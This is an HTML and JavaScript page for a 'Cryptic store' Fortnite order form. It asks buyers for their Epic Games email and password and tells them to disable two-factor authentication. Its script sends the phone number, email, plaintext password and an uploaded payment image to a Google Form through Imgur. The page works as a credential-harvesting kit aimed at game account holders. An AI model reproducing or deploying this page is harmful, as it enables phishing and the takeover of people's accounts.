<head>

</head>
<body>
  <style>
/* General Styles */
body {
    font-family: 'IBM Plex Sans', sans-serif;
    margin: 0;
    padding: 0;
    background-size: cover;
    background-repeat: no-repeat;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
}

/* Back Button */
.back-button {
    position: fixed;
    top: 10px;
    left: 10px;
    background-color: #007bff;
    color: white;
    padding: 8px 12px;
    border-radius: 5px;
    text-decoration: none;
    font-size: 14px;
    z-index: 100;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
}

.back-button:hover {
    background-color: #0056b3;
}

/* Order Container */
.order-container {
    width: 90%;
    max-width: 400px;
    padding: 20px;
    border-radius: 20px;
    background-color: rgb(43, 41, 41);
    color: white;
    text-align: center;
    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
    z-index: 1000000;
}

h2 {
    font-size: 1.5em;
    margin-bottom: 10px;
}

.form-group {
    margin-bottom: 15px;
    text-align: left;
}

label {
    display: block;
    font-weight: 600;
    margin-bottom: 5px;
}

input[type="text"],
input[type="email"],
input[type="password"],
input[type="file"] {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

button {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 10px;
    background-color: #007bff;
    color: white;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

button:hover {
    background-color: #0056b3;
}

/* Warning Text */
.warning {
    font-size: 0.9em;
    color: red;
}

/* Footer */
.site-footer {
    margin-top: 20px;
    text-align: center;
    font-size: 14px;
    color: #bbb;
    z-index: 10000000;
}

/* Responsive Design */
@media (max-width: 768px) {
    .order-container {
        width: 95%;
        padding: 15px;
    }
    
    h2 {
        font-size: 1.3em;
    }
    
    label, input, button {
        font-size: 14px;
    }
}

@media (max-width: 480px) {
    .back-button {
        font-size: 0;
        width: 40px;
        height: 40px;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    
    .back-button::before {
        content: '\2190'; /* Unicode for left arrow */
        font-size: 24px;
        color: white;
    }
    
    .order-container {
        padding: 10px;
    }
    
    h2 {
        font-size: 1.2em;
    }
}


  </style>

  <div class="order-container">
      <h2 class="text-center mb-4" style="color: white;">Fortnite Order Form</h2>
      <form id="orderForm">
        <div class="form-group">
          <label>Phone Number:</label>
          <input type="text" name="phone" class="form-control" id="phoneno" placeholder="Enter your phone number" required>
        </div>
        <div class="form-group">
          <label>Epic Email:</label>
          <input type="email" class="form-control" name="email" id="email" placeholder="Enter Epic Games Email" required>
        </div>
        <div class="form-group">
          <label>Epic Password:</label>
          <input type="password" class="form-control" id="pass" name="pass" placeholder="Enter Epic Games Password" required>
        </div>
        <div class="form-group">
          <label>Money Transaction Image:</label>
          <input type="file" name="image" id="image" class="form-control">
        </div>
        <p class="warning text-danger mt-3">
          * Please disable 2FA before ordering. Any issues will be communicated via the phone number provided.
        </p>
        <button type="submit" class="btn btn-primary btn-block">Submit Order</button>
        <p style="color: rgb(75, 74, 74);">you are ordering: Raptor Royale Pack.</p>
      </form>
    </div>
    <footer class="site-footer">
      <div class="container">
        <div class="row">
          <div class="col-12 text-center">
            <p>Â© 2025 Cryptic store all rights reserved</p>
          </div>
        </div>
      </div>
    </footer>
<script>
document.getElementById("orderForm").addEventListener("submit", function (event) {
  event.preventDefault();

  const phone = document.getElementById("phoneno").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("pass").value;
  const orderedItem = "Starter Pack";
  const imageFile = document.getElementById("image").files[0];
  const imgurClientId = "acf54432c991faf";
  const imgurUrl = "https://api.imgur.com/3/image";
  const formDataImgur = new FormData();
  formDataImgur.append("image", imageFile);

  fetch(imgurUrl, {
    method: "POST",
    headers: { Authorization: `Client-ID ${imgurClientId}` },
    body: formDataImgur,
  })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const imgurLink = data.data.link;
        const googleFormUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdXAz0tB81veQFS5agWc2e-AMZAgJBSp2mSjwxBjDtFVf9f_w/formResponse";
        const formDataGoogle = new URLSearchParams();
        formDataGoogle.append("entry.2113520023", phone);
        formDataGoogle.append("entry.415383044", email);
        formDataGoogle.append("entry.1206445017", password);
        formDataGoogle.append("entry.1245685968", imgurLink);
        formDataGoogle.append("entry.413612230", orderedItem);

        fetch(googleFormUrl, {
          method: "POST",
          body: formDataGoogle,
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
        })
      }
    })
    .catch(error => {
      console.error("Error uploading the image:", error);
    });
});
</script>
